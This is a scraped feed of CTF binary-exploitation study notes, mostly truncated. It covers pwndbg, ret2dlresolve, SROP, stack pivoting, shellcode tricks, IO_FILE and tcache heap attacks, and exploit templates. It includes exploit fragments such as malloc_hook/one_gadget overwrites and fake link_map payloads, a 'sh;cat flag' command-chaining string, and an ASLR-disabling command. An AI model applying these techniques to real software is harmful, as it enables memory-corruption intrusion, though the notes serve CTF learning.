[output_dir]，注意要到pbtk这个文件夹 /home/zp9080/PWN/pbtk/extractors/from_binary.py ./pwn ~/PWN/ #之后再用如下指令就可以得到对应的py文件 protoc --python_out=./ ./devicemsg.proto typedef enum { PROTOBUF_C_TYPE_INT32, 0 /**&amp;lt; int32 */ PROTOBUF_C_TYPE_SINT32, 1 /**&amp;lt; signed int32 */ PROTOBUF_C_TYPE_SFIXED32, 2 /**&amp;lt; signed int32 (4 bytes) */ PROTOBUF_C_TYPE_INT64, 3 /**&amp;lt; int64 */ PROTOBUF_C_TYPE_SINT64, 4 /**&amp;lt; signed int64 */ PROTOBUF_C_TYPE_SFIXED64, 5 /**&amp;lt; signed int64 (8 bytes) */ …  ]]></content></entry><entry><title>pwndbg</title><url>/post/tools/pwndbg/</url><categories><category>Tools</category></categories><tags><tag>tools</tag></tags><content type="html"> [TOC]
基本指令 help //帮助 i //info，查看一些信息，只输入info可以看可以接什么参数，下面几个比较常用 i b //常用，info break 查看所有断点信息（编号、断点位置） i r //常用，info registers 查看各个寄存器当前的值 i f //info function 查看所有函数名，需保留符号 show //和info类似，但是查看调试器的基本信息，如： show args //查看参数 rdi //常用，+寄存器名代表一个寄存器内的值，用在地址上直接相当与一个十六进制变量 backtrace //查看调用栈 q //quit 退出，常用 vmmap //内存分配情况 cyclic 50 //生成50个用来溢出的字符，如：aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
执行指令 s //单步步入，遇到调用跟进函数中，相当于step into，源码层面的一步 si //常用，同s，汇编层面的一步 n //单步补过，遇到函数不跟进，相当于step over，源码层面的一步 ni //常用，同n，汇编层面的一步 c //continue，常用，继续执行到断点，没断点就一直执行下去 r //run，常用，重新开始执行 start // 类似于run，停在main函数的开始
断点指令 下普通断点指令b(break)： b *(0x123456) //常用，给0x123456地址处的指令下断点 b *$rebase(0x123456) //rebase 在调试开PIE的程序的时候可以直接加上程序的随机地址 b fun_name //常用，给函数fun_name下断点，目标文件要保留符号才行 b +0x10 //在程序当前停住的位置下加0x10的位置下断点，同样可以-0x10，就是前0x10 之前没注意这个功能，这样调试的时候就不同按n一直单步跑了 break fun if $rdi==5 //条件断点，rdi值为5的时候才断 删除、禁用断点： info break(简写: i b) //查看断点编号 delete 5 //常用，删除5号断点，直接delete不接数字删除所有 disable 5 //常用，禁用5号断点 enable 5 //启用5号断点 clear //清除下面 …</content></entry><entry><title>python常用</title><url>/post/%E6%9D%82%E4%B9%B1%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/python%E5%B8%B8%E7%94%A8/</url><categories><category>杂乱的知识点</category></categories><tags/><content type="html"><![CDATA[  [TOC]
fromhex，十六进制字符串转换为字节对象互相转化 &gt;&gt;&gt; bytes([0,1,2,3,4,5]).hex() &#39;000102030405&#39; #fromhex这个中间有空格也不影响 &gt;&gt;&gt; bytes.fromhex(&#39;000102030405&#39;) b&#39;\x00\x01\x02\x03\x04\x05&#39; &gt;&gt;&gt; b&#39;abcde&#39;.hex() &#39;6162636465&#39; &gt;&gt;&gt; a = bytes.fromhex(&#39;6162636465&#39;) b&#39;abcde&#39; 切片操作，这个很常用 参考博客 主要讲一下::这个操作 # [::] strs = &#34;https://www.baidu.com/&#34; # 取最后 10 个元素,每 2 个取 1 个 print(strs[-10::2]) # 取第 0 到 10 的元素，每 5个 取 1 个 print(strs[0:10:5]) print(strs[::]) # 倒序 print(strs[::-1]) lists = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10] # 取全部元素，每 3 个 取 1 个 print(lists[::3]) # 倒序 print(lists[::-1]) &#39;&#39;&#39; biucm h: https://www.baidu.com/ /moc.udiab.www//:sptth [1, 4, 7, 10] [10, 9, 8, 7, 6, 5, 4, 3, 2, 1] &#39;&#39;&#39; int #------------------------------------------------------ int.from_bytes(bytes, byteorder, *, signed=False) # 使用小端字节序 byte_data = b&#39;\x01\x00&#39; number = int.from_bytes(byte_data, byteorder=&#39;little&#39;) print(number) # 输出: 1 # 使用大端字节序 byte_data = b&#39;\x01\x00&#39; number = int.from_bytes(byte_data, byteorder=&#39;big&#39;) print(number) # 输出: 256 #-------------------------------------------------------- int(x, base=10) zip zip 是 Python 中的一个内置函数，用于将多个可迭代对象（例如列表、元组）“压缩”在一起，并返回一个元组的迭代器，其中第一个元组包含所有可迭代对象的第一个元素，第二个元组包含所有可迭代对象的第二个元素，依此类推。 list1 = [1, 2, 3] list2 = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;] zipped = zip(list1, list2) # Convert zipped object to a list of tuples zipped_list = list(zipped) print(zipped_list) [(1, &#39;a&#39;), (2, &#39;b&#39;), (3, &#39;c&#39;)]   ]]></content></entry><entry><title>qemu pwn基础知识</title><url>/post/qemu-pwn/qemu-pwn%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url><categories><category>PWN</category><category>Qemu Pwn</category></categories><tags><tag>qemu pwn</tag></tags><content type="html"> [TOC]
常用指令 lspci ls /sys/devices/pci0000\:00/0000\:00\:04.0/ -monitor telnet:127.0.0.1:4444,server,nowait 后 nc 127.0.0.1 4444可以info pci看的更清楚,这个技巧仅限于qemu，发现内核不好使 qemu到底在pwn什么 主要是pwn qemu这个elf文件本身，说是虚拟机但是更像用软件实现虚拟化，qemu文件中有各种各样的函数可以使用，因此泄露之后如何有任意函数执行那么就可以拿到shell 远程一般要反弹shell 主要是把exp复制到.cpio这个压缩包中，这样就可以在qemu中运行我们所写的攻击脚本 mkdir exp cp ./initramfs-busybox-x64.cpio.gz ./exp/ cd exp gunzip ./initramfs-busybox-x64.cpio.gz cpio -idmv &amp;lt; ./initramfs-busybox-x64.cpio mkdir root cp ../exp.c ./root/ gcc ./root/exp.c -o ./root/exp -static find . | cpio -o --format=newc &amp;gt; initramfs-busybox-x64.cpio gzip initramfs-busybox-x64.cpio cp initramfs-busybox-x64.cpio.gz .. 有关调试 主要有两种调试方法 直接gdb qemu这个文件，然后set args设置启动参数 运行./launch.sh，然后ps -ef | grep qemu，通过gdb -p 进程号就可以连上进行调试了 发现想打exp里面的断点很困难，那就把断点打在qemu这个文件中，比如b fastcp_mmio_write,然后c就行了 基础知识 有很多前人的参考博客就基本知识就不过多赘述，主要记录自己的一些理解 入门最好的博客 一篇简短地讲qemu pwn到底在干什么的博客 很详细地讲了qemu的基础知识 这篇博客也不错 地址转化 这一点还是比较重要的，只有地址正确才能正确的执行相应的函数 PCI 设备地址空间 主要就是MMIO和PMIO，目前只pwn过MMIO的 主要漏洞 一般的漏洞都是读写的错误，特别是写的越界，因此注意检查size的限制很重要</content></entry><entry><title>realloc调整堆栈</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BB%E6%97%A7%E7%89%88/realloc%E8%B0%83%E6%95%B4%E5%A0%86%E6%A0%88/</url><categories><category>PWN</category><category>堆攻击旧版</category></categories><tags><tag>realloc调整堆栈</tag></tags><content type="html"><![CDATA[   注意realloc_hook就在malloc_hook-8的位置 # __malloc_hook -&gt; realloc+8 # __realloc_hook -&gt; one_gadget realloc = libc_base + libc.sym[&#39;realloc&#39;] one_gadget = [0x4527a, 0xf03a4, 0xf1247] add(4, 0x68, b&#39;p&#39; * 11 + p64(libc_base + one_gadget[0]) + p64(realloc + 8))   ]]></content></entry><entry><title>ret2dlresolve</title><url>/post/stackoverflow/ret2dlresolve/</url><categories><category>PWN</category><category>Stackoverflow</category></categories><tags><tag>stackoverflow</tag></tags><content type="html"><![CDATA[  [TOC] 参考博客 适用于NO RELRO, Partial RELRO，在64位中一般都是打linkmap结构体，板子题
攻击模板 总结地说，我们需要
st_other != 0 l -&amp;gt; l_addr = system_libc - a_libc；sym -&amp;gt; st_value = a_got （其中，a 函数是已经被解析过的一个函数） 那么最后得到的就是 l-&amp;gt;l_addr + sym-&amp;gt;st_value = system_libc - a_libc + a_got = system_libc_real，因此，这种攻击方法需要我们同时伪造 Elf_Sym 和 link_map 注意这个PLT是bnd jmp cs:qword_404010这条指令 rdi = 0x401683 rsi_r15 = 0x401681 leave = 0x4013c2 ret = 0x40101a PLT = 0x401026 buf = elf.bss() + 0x400 def fake_Linkmap_payload(fake_linkmap_addr,known_func_ptr,offset): # &amp;amp;(2**64-1)是因为offset通常为负数，如果不控制范围，p64后会越界，发生错误 linkmap = p64(offset &amp;amp; (2 ** 64 - 1))#l_addr # fake_linkmap_addr + 8，也就是DT_JMPREL，至于为什么有个0，可以参考IDA上.dyamisc的结构内容 linkmap += p64(0) # 可以为任意值 linkmap += p64(fake_linkmap_addr + 0x18) # 这里的值就是伪造的.rel.plt的地址 # fake_linkmap_addr + 0x18,fake_rel_write,因为write函数push的索引是0，也就是第一项 linkmap += p64((fake_linkmap_addr + 0x30 - offset) &amp;amp; (2 ** 64 - 1)) # Rela-&amp;gt;r_offset,正常情况下这里应该存的是got表对应条目的地址，解析完成后在这个地址上存放函数的实际地址， …  ]]></content></entry><entry><title>sandbox</title><url>/post/stackoverflow/sandbox/</url><categories><category>PWN</category><category>Stackoverflow</category></categories><tags><tag>stackoverflow</tag></tags><content type="html"> [TOC]
sandbox sandbox检测工具 seccomp-tools dump ./file 有时候直接用这个指令没有检测到沙盒，一般是因为程序还没有执行到沙盒，随便输入执行到沙盒就行
prctl函数 可以看看这篇博客 以及这篇博客 prctl函数原型：int prctl(int option,unsigned long argv2,unsigned long argv3,unsigned long argv4，unsigned long argv3) include/linux/prctl.h里面存储着prctl的所有参数的宏定义，prctl的五个参数中，其中第一个参数是你要做的事情，后面的参数都是对第一个参数的限定。 在第一个参数中，我们需要重点关注的参数有这两个： (1).PR_SET_SECCOMP(22)：当第一个参数是PR_SET_SECCOMP,第二个参数argv2为1的时候，表示允许的系统调用有read，write，exit和sigreturn；当argv等于2的时候，表示允许的系统调用由argv3指向sock_fprog结构体定义，该结构体成员指向的sock_filter可以定义过滤任意系统调用和系统调用参数。(细节见下图) (2).PR_SET_NO_NEWPRIVS(38):prctl(38,1,0,0,0)表示禁用系统调用execve()函数，同时，这个选项可以通过fork()函数和clone()函数继承给子进程。 一个例子 这里的args[0],args[2]看着很奇怪，实际上就是第几个参数，rdi=args[0],rdx=args[2],所以这里可以使用write函数，但是每次只让读入一个字节</content></entry><entry><title>setuid</title><url>/post/pwn%E7%AC%94%E8%AE%B0/setuid/</url><categories><category>PWN</category><category>PWN笔记</category></categories><tags><tag>pwn</tag></tags><content type="html"> 最近做了一个题执行了system(&amp;quot;/bin/sh&amp;quot;)后发现flag只有root才有read权限，这里要提权 可以参考此篇博客 setuid(0) 是一个系统调用，用于将进程的有效用户 ID （Effective User ID）设置为 0，即将进程的权限提升为超级用户或者 root 用户。在 Unix 和类 Unix 系统中，root 用户拥有系统中的最高权限，可以执行任何操作，包括对系统的所有资源进行修改和管理。setuid(0) 的作用是将进程的权限提升为超级用户，从而使得进程能够执行一些需要特权的操作，比如访问系统资源、修改系统配置、创建新的进程等。通常情况下，只有 root 用户或者具有 root 权限的进程才能够调用 setuid(0) 来提升权限。</content></entry><entry><title>shellcode tricks</title><url>/post/shellcode/shellcode-tricks/</url><categories><category>PWN</category><category>Shellcode</category></categories><tags><tag>shellcode</tag></tags><content type="html"><![CDATA[  常用系统调用号 syscall 64位 0-&gt;read 1-&gt;write 2-&gt;open 5-&gt;fstat 9-&gt;mmap 0xa-&gt;mprotect 0xf-&gt;rt_sigreturn 0x3b-&gt;execve 0x5a-&gt;chmod int 0x80 32位 3-&gt;read 4-&gt;write 5-&gt;open 0xb-&gt;execve
有时候受字长限制可以考虑eax,ax,al这种寄存器,让shellcode变短 cdq指令让edx归0 xor eax,eax这种来清0 很多情况下受字长限制的shellcode很可能再read一次，或者mmap，myprotect开辟新的空间 注意残留寄存器的值是否可以利用 可以用\x90也就是nop过渡,gs也可以过渡 push idata，idata有范围限制，最大为32位，不能再大了 xchg eax,esi \x96 一个字节 交换两个寄存器的值 要充分利用残留的寄存器的值来xor出syscall 一般情况下限制了输入长度的shellcode都是要调用read的，题目中的read还进行了检查，但是自己实现的read没有检查并且可以读入很多。一次read不够就两次，pop rdx可以设置rdx为栈上的值，这一般可以很大，并且不用像mov dx,0x50那样会通不过字符检查,jmp rax可以跳转到一个很大的地方执行 要合理地利用栈上残留的数据，利用push pop得到该数据 jmp指令,jmp $+2   ]]></content></entry><entry><title>shellcode网站</title><url>/post/shellcode/shellcode%E7%BD%91%E7%AB%99/</url><categories><category>PWN</category><category>Shellcode</category></categories><tags><tag>shellcode</tag></tags><content type="html"> 详细阐述了各种shellcode 可以查看各个指令对应的机械码 系统调用号 汇编网站 shellcode库</content></entry><entry><title>skills</title><url>/post/pwn%E7%AC%94%E8%AE%B0/skills/</url><categories><category>PWN</category><category>PWN笔记</category></categories><tags><tag>pwn-skills</tag></tags><content type="html"><![CDATA[   有read函数最好用send，scanf和gets必须用sendline init函数也要查看，有时候一些变量的初始化就在其中 strlen的绕过：strlen()函数C语言0x00在无符号数组使用中，只读取0x00前面的长度，因此输入\x00绕过 password是通过 /dev/urandom 来⽣成的，所以是完全随机，所以第⼀个字节也有可能是‘\00’，⽽strcmp是匹配到‘\00’结束，所以我 们只需要输⼊‘\00’去爆破即可 经常犯的一个错误就是，想要泄露栈上的内容，但是如果调用了一个函数后栈上内容会改变，我们应当先跑进这个函数里面再看栈的内容 有时候gdb发现invalid address在read函数处，可能是因为忘记sh.send所以卡在了read函数处 格式化字符串的时候有时候想看输出，可以用个pause 当程序中没有输出函数的时候（泄露不了Libc），可以考虑打ret2syscall，要注意程序中无法反汇编的地方，可能就是题目想给你的gadgets 当一次read不够用时，可以构造rop链多次read scanf（不管是%d还是%s）必须要用sendline，因为scanf遇到空格或者\n才停止读取；read一般都用send，避免\n的覆盖 每次如果别人的read函数是自定义的，注意最末尾的处理 比如这个就是要么大于输入长度，要么遇到\x0a停止，并且这个结束的位置会变成\x00，要注意有没有被覆盖，进行适当的处理 dbg的时候可以用pause避免错过 gdb -c core注意core文件在哪 有溢出的情况下要仔细查看溢出的长度 一开始堆块不干净可以通过add等操作把堆块变干净方便做题 有时候ida反汇编会出错，觉得需要判断的地方看汇编代码 逆向有很多中有时候会有msg类似的结构体，需要逆向出结构体 有时候需要交互过后才能seccomp-tools才能检测出sandbox，可以这样p=process([&ldquo;seccomp-tools&rdquo;,&lsquo;dump&rsquo;,&rsquo;./pwn&rsquo;]) 没给libc说明不需要，甚至不需要泄露，因为要留意题目中的后门   ]]></content></entry><entry><title>socket</title><url>/post/web-pwn/socket/</url><categories><category>PWN</category><category>Web Pwn</category></categories><tags><tag>web pwn</tag></tags><content type="html"><![CDATA[  [TOC] 这篇文章生动详细地讲清楚了socket到底是什么 相关知识 一些关键理解 注意这里和反弹shell不太一样，反弹shell创建了套间字后直接connect就行了 可以认为套接字这种方式就像一个中转站，将服务端和客户端联系起来，然后socket函数创建一个总的套接字，后面的函数创建分的套接字 套接字描述符类似于文件描述符，可以往里面写东西。区分好服务端和客户端就行 也可以用read和write进行读写，套接字描述符就像文件描述符 socket函数 socket() 函数创建的套接字：这个套接字是一个总的套接字，它是服务器端用于监听连接请求的套接字（对于TCP服务器端）或是客户端用于发起连接请求的套接字。这个套接字是用于整个通信过程的起点，它是后续通信的基础。 后续操作创建的套接字：在建立连接之后，accept() 函数会创建一个新的套接字，用于表示与客户端建立的连接。这个套接字是专门用于与特定客户端进行通信的，是一种独立的套接字。而在客户端，通过 connect() 函数建立连接后，也会创建一个用于与服务器通信的套接字。这些套接字都是后续通信过程中使用的。 总之，socket() 函数创建的套接字是整个通信过程的起点，而后续操作创建的套接字是用于与特定对端进行通信的。这些后续操作创建的套接字可以视为衍生自总的套接字。 相关结构体 sockaddr_in 结构体是用于表示 IPv4 地址和端口的数据结构，通常在网络编程中使用。它定义在 &amp;lt;netinet/in.h&amp;gt; 头文件中，并且在 BSD 系统和类 Unix 系统中广泛使用。 struct sockaddr_in { short sin_family; // 地址族，通常为 AF_INET unsigned short sin_port; // 16位的端口号，网络字节序 struct in_addr sin_addr; // IPv4 地址结构 char sin_zero[8]; // 填充字段，通常用0填充 }; struct in_addr 是用于表示 IPv4 地址的数据结构，在网络编程中经常被使用。它通常定义在 &amp;lt;netinet/in.h&amp;gt; 头文件中 struct in_addr { in_addr_t s_addr; // 32 位的 IPv4 地址，以网络字节 …  ]]></content></entry><entry><title>srop</title><url>/post/stackoverflow/srop/</url><categories><category>PWN</category><category>Stackoverflow</category></categories><tags><tag>stackoverflow</tag></tags><content type="html"> [TOC]
一些重要理解 rsp必须必须指向fake_frame的底部，不然sigreturn无法正常执行 fake_frame中的rip的值就是sigreturn执行完后立即执行的指令地址 mov_rax_0xf_ret后只要是syscall就行了，相当于ret后直接执行sigreturn系统调用。但是rip必须指向syscall_ret，因为中途不可以打乱rsp指向 当没有直接syscall_ret时,rip也可以指向0x401186，这也没有改变rsp指向 一次不对多dbg 区分syscall系统调用和包装好的syscall函数 基本原理 Srop 的全称是Sigreturn Oriented Programming Srop 可以理解成一种高级的ROP，利用了linux下15号系统调用的-&amp;amp;gt;rt_sigreturn
Signal是Unix系统中的一种通信机制，通常用于在进程之间传递信息，也可以说是软中断信息。常见于在一个进程中，内核向其发送发送软中断信号，该进程将暂时被挂起，系统进入内核态，因为是暂时被挂起，所以系统会保留该进程的上下文 linux处理signal流程如下图所示，在程序接收到signal信号时会去①保存上下文环境（即各种寄存器），接下来走到②执行信号处理函数，处理完后③恢复相关栈环境，④继续执行用户程序。而在恢复寄存器环境时没有去校验这个栈是不是合法的，如果我们能够控制栈，就能在恢复上下文环境（也就是③）这个环节直接设定相关寄存器的值。 内核会为该进程保存相应的上下文，主要是将所有寄存器压入栈中（所以srop是一种高级的栈溢出），以及压入 signal 信息，以及指向 sigreturn 的系统调用地址。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码 利用原理 漏洞利用点
Signal Frame 被保存在用户的地址空间中，所以用户是可以读写的。 由于内核与信号处理程序无关 (kernel agnostic about signal handlers)， …</content></entry><entry><title>stack_migration</title><url>/post/stackoverflow/stack_migration/</url><categories><category>PWN</category><category>Stackoverflow</category></categories><tags><tag>stackoverflow</tag></tags><content type="html"> [TOC]
栈迁移 栈迁移的核心是leave_ret指令，要清楚leave_ret指令的作用 栈迁移：rbp覆盖为我们想要转移到的地址-8（注意有个pop指令，因此要减8）（因为程序结束本来就有个leave_ret，再加上我们的leave_ret，最终结果就是让rsp=rbp覆盖的值+8），ret覆盖为任意一个leave_ret指令的地址即可。进行栈迁移的时候最好动笔写一写看看rbp,rsp的值到底变成了多少就知道payload写没写对 栈迁移要注意这个rbp改变后，read函数还是根据rbp-buffer来确定rsi，因此通过栈迁移可以实现任意写 伪栈帧 伪栈帧的核心就是找到一块可写的位置写入我们的rop链，再将rip指向这个地方开始执行。一般这个位置就是bss段后面一点的位置，最好后面多一点，不然可能覆盖了原本有用的地方让程序异常终止 buffer padding|fake rbp|leave ret addr| 构造伪栈帧的时候要想清楚返回地址应当覆盖为什么，有时候是main中的read函数，有时候是leave_ret，可以多次调用main中的read，只要我们设计好这个伪栈帧，控制好rbp和rsp的值，就可以随意地控制程序的流程 控制rsp有很多种方式，比如push pop leave ret指令，但是leave指令很特殊，它可以控制rbp的值，特别是我们的read函数一般都是read(0,rbp-0xc0,0x100)，我们要清楚我们向我们构造的伪栈帧哪个位置read写入rop链 向bss写入rop时要控制rsi，有多种控制rsi方式：1.如果给的可溢出的空间太小，一般通过mov rax,[rbp-buf]来控制，也就是我们覆盖rbp的值通过leave中的push rbp来实现 2.直接通过libc中的gadget来控制,如图可以用pop rax来控制 构造伪栈帧最好画出我们构造的rop链的流程图，可以清楚地看见rop链执行到何处。同时要注意我们rop链中rsp的变化，因为我们的ret指令依赖于rsp，这也是控制的核心 画出构造出的伪栈帧方便看rsp的变化 引起rsp变化的有 1.add rsp,8这种直接变化的 2.push pop指令 3.ret指令（这个很容易忽略），注意leave_ret指令
一些细节 如果在bss段构造伪栈帧，最好把偏移弄大一点，不然有时候会写到不该访问的地址，造成segmentfault</content></entry><entry><title>stderr</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BBio_file/stderr/</url><categories><category>PWN</category><category>堆攻击IO_FILE</category></categories><tags><tag>stderr</tag></tags><content type="html"> 在打IO攻击的时候经常需要用到malloc_assert，要打stderr,这里区分一下几个概念 1.直接打_IO_2_1_stderr_ 如果可以任意地址写，可以直接将_IO_2_1_stderr_修改，将其vtable修改为IO_xxx_jumps，但是一般不会有这么理想的情况 2.修改stderr的指向 elf文件中bss段上的stderr libc中got表中的stderr libc中.data位置的stderr 可以看到很多地方都存的有_IO_2_1_stderr_,但是IO攻击中实际要修改的是elf文件的bss段的stderr，如果elf文件的bss段没有stderr，此时修改libc的.data区域才有用 具体原理</content></entry><entry><title>stdout</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BBio_file/stdout/</url><categories><category>PWN</category><category>堆攻击IO_FILE</category></categories><tags><tag>stdout</tag></tags><content type="html"><![CDATA[  [TOC] 遇到puts或printf，就会将_IO_write_base指向的内容打印出来。实际操作中发现如果是write函数还不行
stdout原理 这篇文章非常详细 stdout例题 具体可见这篇文章 代码 这里给出爆破的模板
while True: try: p=process(file) exp() break except: p.close() continue trick 覆盖一字节泄露libcbase add(0x40,p64(0xfbad1887)+p64(0)*3+b&rsquo;\x00') 图示 直接gdb.attach到这个位置查看泄露出来的是什么然后手动算偏移 原理 对于一个libc里面的函数,其地址为libcbase+libc.sym[&rsquo;&hellip;&rsquo;],_IO_2_1_stdout_和main_arena非常接近，因此覆盖2字节后只有1位不同（在此图中是4和3不同），因此要进行爆破，1/16概率 泄露retaddr add(0x80,p64(0xfbad1800)+p64(0)*3+p64(environ)+p64(environ+8)) dbg手算泄露的environ的值与retaddr的相对偏移 一些比较细节的东西 注意这里的指针有多少次解引用，如果一个chunk在unsortedbin或者largebin中，其fd加上这个getnum，就可以让stdout里面的位置置0 flags规则 flags很重要，因为这决定的函数的走向 puts()函数执行流程 具体细节见博客 经过一系列调用最后进行系统调用 _IO_puts -&gt; _IO_new_file_xsputn -&gt; _IO_OVERFLOW -&gt; _IO_do_write -&gt; new_do_write -&gt; _IO_SYSWRITE
重点
  ]]></content></entry><entry><title>system_execve函数</title><url>/post/pwn%E7%AC%94%E8%AE%B0/system_execve%E5%87%BD%E6%95%B0/</url><categories><category>PWN</category><category>PWN笔记</category></categories><tags><tag>pwn</tag></tags><content type="html"><![CDATA[  [TOC]
system函数 system(&quot;$0&quot;) system(&ldquo;sh&rdquo;) system(&quot;/bin/sh&quot;) system(&quot;/bin//sh&quot;)都可以拿到shell cat *：是一个在命令行中使用的Unix/Linux命令。它的作用是将指定目录下所有文件的内容连接到标准输出（通常是显示在终端上）。这里的 * 通配符表示匹配所有文件。 ; 是命令分隔符，它允许在一行中执行多个命令。不同指令之间要么用;隔断，要么要用\x00 如system(“sh;cat flag\x00”) execve函数 execve是一个用于在Linux和Unix系统上执行新程序的系统调用。
int execve(const char *filename, char *const argv[], char *const envp[]); filename: 这是一个指向要执行的可执行文件的路径的字符串。在调用execve时，系统会加载并执行指定路径的可执行文件。 argv: 这是一个字符串数组，表示新程序的命令行参数。数组的第一个元素通常是可执行文件的名称，接下来是可选的命令行参数，最后以NULL结尾。即argv数组中的每个元素都是一个字符串指针，指向一个命令行参数。例如，{&quot;/bin/ls&quot;, &ldquo;-l&rdquo;, NULL}表示执行/bin/ls -l命令。 envp: 这是一个字符串数组，表示新程序的环境变量。数组的每个元素都是一个字符串指针，指向一个环境变量字符串，最后以NULL结尾。通常，我们可以将envp设置为NULL，以继承父进程的环境变量。 比如execve(“/bin/cat”,{“/bin/cat”,“/flag”,NULL},0) execve系统调用用于用一个新的程序替换当前进程的映像。在这个例子中，它会启动/bin/cat程序，并将/bin/cat程序替换为当前正在运行的程序。当/bin/cat运行时，它将尝试打开并显示/flag文件的内容。   ]]></content></entry><entry><title>tcache stashing unlink attack</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BBtcache/tcache-stashing-unlink-attack/</url><categories><category>PWN</category><category>堆攻击tcache</category></categories><tags><tag>tcache stashing unlink attack</tag></tags><content type="html"><![CDATA[  [TOC] 学习时参考的博客 一篇讲原理的博客 例题博客 例题博客 例题博客 1.获得任意地址target_addr的控制权 2.在任意地址target_addr写入大数值 但是说实话这个技巧除了配合house of pig好像没有太大作用
代码 calloc(0xa0) #让tcache中有6个0xb0的chunk for i in range(6): calloc(0xa0) free(i) #---------------------一般都是通过切割unsorted bin来得到smallbin的堆块------------------- calloc(0x4b0) #9 calloc(0xb0) #10 free(9) #此时smallbin有1个0xb0的chunk calloc(0x400) calloc(0x4b0) #11 calloc(0xb0) #12 free(11) #此时smallbin有2个0xb0的chunk calloc(0x400) #13 edit(11,b&amp;#39;\x00&amp;#39;*0x400+p64(prev_size)+p64(size)+p64(heapbase+0xb00)+p64(target_addr-0x10)) #tcache 0xb0 :6个 #smallbin 0xb0 :bin-&amp;gt;chunkA-&amp;gt;chunkB chunkA的bk为target_addr-0x10 #触发tcache stashing unlink attack calloc(0xa0) 核心 define last(b) ((b)-&amp;gt;bk) if ((tc_victim = last (bin)) != bin) bck = tc_victim-&amp;gt;bk; bin-&amp;gt;bk = bck; bck-&amp;gt;fd = bin; 任意地址上写一个较大的数（和unsortedbin attack 类似） tcache_put (tc_victim, tc_idx);
如果我们可以控制smallbin的bk，那么bck就可以为任意地址，而后它又被放到tcache中，我们可以将它再malloc出来利用 bin在main_arena附近，那么bck-&amp;gt;fd=bin实现了任意地址上写一个较大的数 限制: 需要UAF 主要适 …  ]]></content></entry><entry><title>tcache_perthread_struct</title><url>/post/%E5%A0%86%E6%94%BB%E5%87%BBtcache/tcache_perthread_struct/</url><categories><category>PWN</category><category>堆攻击tcache</category></categories><tags><tag>tcache_perthread_struct</tag></tags><content type="html"> [TOC] tcache_perthread_struct可以free掉，在libc2.30以下的版本tcache_perthread_struct大小为0x250;在libc2.30及以上大小变成了0x290（因为counts的类型从char变成了uint16_t） 可以在tcache_perthread_struct上进行堆布局实现一些目的
修改counts 之前写过一个题只让申请两个堆块，但是我们想要填满tcache来泄露libcbase,这时候可以先泄露heapbase得到tcache_perthread_struct的位置，修改tcache_perthread_struct中的counts域达到填满tcache的效果 直接在tcache_perthread_struct里面进行堆布局 tcache_perthread_struct可以被free VNCTF2021 ff
此题只可show一次，edit两次，因为这唯一一次show显然是泄露heapbase，泄露libcbase就需要通过打stdout来进行 show,del,show只可对最近add的堆块进行，这是很大一个难点 通过edit让申请到的tcache_perthread_struct使0x290的tcache变满，再free掉tcache_perthread_struct，那么tcache_perthread_struct就进入了unsorted bin，这时候再分配chunk,就会切割tcache_perthread_struct然后向tcache_perthread_struct写入main_arena附近的位置，为了保持unsorted bin不断，相应的fd,bk都写入了unsortedbin所在的位置，再进行partial overwrite就造出了_IO_2_1_stdout 通过编辑tcache_entry *entries[TCACHE_MAX_BINS]里面内容，相当于给tcache添加了某些chunk，但是要注意取chunk时tcache的counts要大于1 错误分析 第一处申请tcache_perthread_struct结构时最初想这样构造，这里的错误是再add(0x70,b)会从tcache里面取chunk,修改后0x80 …</content></entry><entry><title>templates</title><url>/post/pwn%E7%AC%94%E8%AE%B0/templates/</url><categories><category>PWN</category><category>PWN笔记</category></categories><tags><tag>pwn-templates</tag></tags><content type="html"><![CDATA[  [TOC]
recv canary=int(sh.recvuntil(b&quot;00&quot;).decode(),16) buffer= int(p.recv(14), 16) 两个十六进制是一个字节，但是printf函数打印是一个字符一个字符的打印，一个字符是一个字节，所以0x7ffec1484618也就是buffer的地址要接受14个字节 关闭alsr
sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space exit patchelf 一篇文章搞定版本问题 一篇文章搞定C++版本问题 查看.so文件的版本：strings .so文件的路径 | grep &ldquo;GLIBC&rdquo; ldd pwn可以查看pwn文件的libc与ld文件 patchelf做法 1.首先把pwn文件,libc文件，ld文件放在同一个文件夹 2.patchelf --replace-needed libc.so.6 /home/zp9080/PWN/libc.so.6 ./pwn 3.patchelf --set-interpreter /home/zp9080/PWN/ld-linux-x86-64.so.2 ./pwn 4.chmod +x /home/zp9080/PWN/ld-linux-x86-64.so.2 5.chmod +x pwn 这里的路径最好用绝对路径，不然必须在这个文件夹里才可以访问，相对路径是根据运行程序的时候shell所处的目录来的 &lt;font color=red&gt;4.给libc.so文件和ld文件x权限&lt;/font&gt; libc puts_addr = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;)) puts_addr=u64(io.recv(6).ljust(8,b&#39;\x00&#39;)) 三种计算libc的解法 1. libcbase = puts_addr - libc.symbols[&#39;puts&#39;] system_addr = libcbase + libc.symbols[&#39;system&#39;] bin_addr = libcbase + next(libc.search(b&#39;/bin/sh&#39;)) 2. libc = LibcSearcher(&#34;puts&#34;,puts_addr) libcbase = puts_addr - libc.dump(&#34;puts&#34;) system_addr = libcbase + libc.dump(&#34;system&#34;) bin_addr = libcbase + libc.dump(&#34;str_bin_sh&#34;) 3. 查询libc后手动计算 orw 有时候flag=libcbase + next(libc.search(b&rsquo;flag&rsquo;))找到的不是flag字符串，而是flags或者别的，这时候要自己写入flag字符串
